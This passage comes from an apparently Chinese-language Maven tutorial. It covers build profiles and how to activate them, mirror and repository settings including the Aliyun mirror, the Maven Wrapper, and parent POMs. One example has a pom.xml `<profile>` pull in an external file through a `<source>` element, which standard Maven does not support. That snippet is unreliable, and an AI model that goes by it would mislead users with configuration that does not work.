class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>profile-id<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 激活条件 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 自定义属性 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 依赖 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 构建配置 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="profile示例与使用"><a href="#profile示例与使用" class="headerlink" title="profile示例与使用"></a>profile示例与使用</h4><ol><li><p>外部独立文件的profile，并通过pom.xml引</p><ol><li><p>项目结构示例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my-project/</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src/</span><br><span class="line">└── profiles/</span><br><span class="line">    ├── dev-profile.xml</span><br><span class="line">    └── prod-profile.xml</span><br></pre></td></tr></table></figure></li><li><p>profile文件内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- dev-profile.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">env</span>&gt;</span>development<span class="tag">&lt;/<span class="name">env</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app.config</span>&gt;</span>config-dev.properties<span class="tag">&lt;/<span class="name">app.config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dev-tool<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- prod-profile --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>prod<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">env</span>&gt;</span>production<span class="tag">&lt;/<span class="name">env</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app.config</span>&gt;</span>config-prod.properties<span class="tag">&lt;/<span class="name">app.config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>prod-tool<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">skipTests</span>&gt;</span>true<span class="tag">&lt;/<span class="name">skipTests</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>pom.xml中引用</p><ol><li>在<code>&lt;profile&gt;</code>中使用id和source</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- 引用外部 Profile 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span>&gt;</span>profiles/dev-profile.xml<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>prod<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span>&gt;</span>profiles/prod-profile.xml<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 引用 Profile 中定义的属性 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">environment</span>&gt;</span>$&#123;env&#125;<span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">config.file</span>&gt;</span>src/main/resources/$&#123;app.config&#125;<span class="tag">&lt;/<span class="name">config.file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ol></li><li><p><em><strong>CASE1: pom.xml的profile中直接指定</strong></em></p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 运行: mvn test --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>CASE2: 使用<code>-P</code>参数指定</strong></em></p><ol><li>指定<code>&lt;id&gt;</code>即可</li></ol> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 运行: mvn test -P test --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 第一个 test 为 Maven 生命周期阶段，第 2 个 test 为构建配置文件指定的 &lt;id&gt; 参数，这个参数通过 -P 来传输 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>test<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>CASE3: 使用setting.xml指定</strong></em></p><ol><li>打开<code>%USER_HOME%/.m2/setting.xml</code>(如果 setting.xml 文件不存在就直接拷贝 %M2_HOME%&#x2F;conf&#x2F;settings.xml 到 .m2 目录， %M2_HOME% 代表 Maven 的安装目录)</li><li>配置 setting.xml 文件，增加<code>&lt;activeProfiles&gt;</code>属性</li></ol> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 仍然需要在pom.xml中设置不同的profile使用条件(pom.xml同CASE1) --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 运行(无需指定-P): mvn test --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeProfiles</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">activeProfile</span>&gt;</span>test<span class="tag">&lt;/<span class="name">activeProfile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activeProfiles</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>CASE4: 通过环境变量</strong></em></p><ol><li>在profile中加入<code>&lt;activation&gt;</code>标签，指定环境变量的值</li><li>使用 -D 传递环境变量</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 运行: mvn test -Denv=dev --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>dev<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Maven换源"><a href="#Maven换源" class="headerlink" title="Maven换源"></a>Maven换源</h2><h3 id="mirrors-and-repositories"><a href="#mirrors-and-repositories" class="headerlink" title="mirrors and repositories"></a>mirrors and repositories</h3><ol><li>源(mirrors)与repositories<ol><li><p><strong>repositories</strong></p><ol><li>含义：Maven仓库是存放和获取构件（如JAR文件、POM文件等）的地方。这些仓库可以是本地的，也可以是远程的</li><li>分类<ol><li>本地仓库（Local Repository）：位于开发者本地机器上的目录，默认路径为 ~&#x2F;.m2&#x2F;repository。当Maven从远程仓库下载依赖时，会将这些依赖存储在本地仓库中以便后续使用</li><li>中央仓库（Central Repository）：由Maven社区维护的一个公共仓库，包含了大量的开源库</li><li>远程仓库（Remote Repository）：除了中央仓库外，还可以配置其他远程仓库，通常是私有仓库或第三方提供的仓库</li></ol></li><li>作用<ol><li>依赖管理：通过指定多个远程仓库，确保Maven能够找到并下载所需的依赖项</li><li>发布构件：开发者可以通过配置将自己项目的构件发布到远程仓库中，供其他项目使用</li></ol></li></ol></li><li><p><strong>Mirrors</strong></p><ol><li>含义：Maven镜像是对某个仓库的完整副本，通常用于提高下载速度或增强可靠性。镜像服务器会定期同步源仓库的内容，以保持数据的一致性</li><li><code>&lt;mirrorOf&gt;</code>: 指定了哪些仓库（repositories）会被镜像服务器替代</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>central-mirror<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://mirror.example.com/maven2<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>all-mirrors<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://global-mirror.example.com/maven2<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="换源操作"><a href="#换源操作" class="headerlink" title="换源操作"></a>换源操作</h3><ol><li><p><em><strong>CASE1: 修改 Maven 的 settings.xml</strong></em></p><ol><li><p>文件位置</p><ol><li>全局配置：位于 Maven 安装目录的 conf&#x2F; 文件夹下（如：&#x2F;usr&#x2F;local&#x2F;maven&#x2F;conf&#x2F;settings.xml）</li><li>用户配置：位于用户目录下的 .m2&#x2F; 文件夹中（如：~&#x2F;.m2&#x2F;settings.xml）</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 完整的settings.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0 https://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><em><strong>CASE2: pom.xml中设置</strong></em></p><ol><li>直接在repositories上下其手就好了</li></ol> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="一些实践与解决方案"><a href="#一些实践与解决方案" class="headerlink" title="一些实践与解决方案"></a>一些实践与解决方案</h2><h3 id="mvn-wrapper"><a href="#mvn-wrapper" class="headerlink" title="mvn wrapper"></a>mvn wrapper</h3><h4 id="mvnw介绍与结构"><a href="#mvnw介绍与结构" class="headerlink" title="mvnw介绍与结构"></a>mvnw介绍与结构</h4><ol><li><p>什么是mvn wrapper</p><ol><li>Maven Wrapper（简称 mvnw）是一个用于在没有预先安装 Maven 的环境中运行 Maven 项目的工具。它允许开发者将 Maven 的二进制文件和配置文件与项目一起打包，从而确保**所有开发者或构建环境使用相同版本的 Maven (跨平台)**，避免因 Maven 版本不一致导致的问题</li></ol></li><li><p>Maven Wrapper 包含以下文件</p><ol><li>mvnw：Unix&#x2F;Linux&#x2F;MacOS 下的可执行脚本</li><li>mvnw.cmd：Windows 下的可执行脚本</li><li>.mvn&#x2F;wrapper&#x2F; 目录<ol><li>maven-wrapper.jar：Maven Wrapper 的核心实现。</li><li>maven-wrapper.properties：指定要使用的 Maven 版本</li><li>当运行 mvnw 时，它会检查本地是否已经下载了指定版本的 Maven。如果没有，它会自动从 Maven 官方仓库下载并缓存到用户目录下的 .m2&#x2F;wrapper&#x2F; 中</li></ol></li></ol> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── mvnw</span><br><span class="line">├── mvnw.cmd</span><br><span class="line">└── .mvn</span><br><span class="line">    └── wrapper</span><br><span class="line">        ├── maven-wrapper.jar</span><br><span class="line">        └── maven-wrapper.properties</span><br></pre></td></tr></table></figure></li></ol><h4 id="为项目添加mvnw"><a href="#为项目添加mvnw" class="headerlink" title="为项目添加mvnw"></a>为项目添加mvnw</h4><ol><li><p><em><strong>CASE1: 使用maven插件生成</strong></em></p><ol><li>Maven 提供了 maven-wrapper 插件，可以快速为项目生成 Maven Wrapper</li></ol> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 运行: mvn wrapper:wrapper --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 随后使用 mvnw 或 mvnw.cmd 代替 mvn 命令即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-wrapper-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mavenVersion</span>&gt;</span>3.8.6<span class="tag">&lt;/<span class="name">mavenVersion</span>&gt;</span> <span class="comment">&lt;!-- 指定 Maven 版本 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="maven模块化"><a href="#maven模块化" class="headerlink" title="maven模块化"></a>maven模块化</h3><h4 id="父子pom"><a href="#父子pom" class="headerlink" title="父子pom"></a>父子pom</h4><ol><li><p>父POM配置</p><ol><li>packaging：父模块的packaging必须设置为pom</li><li>模块声明：在<code>&lt;modules&gt;</code>中列出所有子模块</li><li>依赖管理：使用<code>&lt;dependencyManagement&gt;</code>统一管理依赖版本，子模块需显式声明依赖</li><li>插件管理：使用<code>&lt;pluginManagement&gt;</code>统一管理插件配置</li></ol> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span 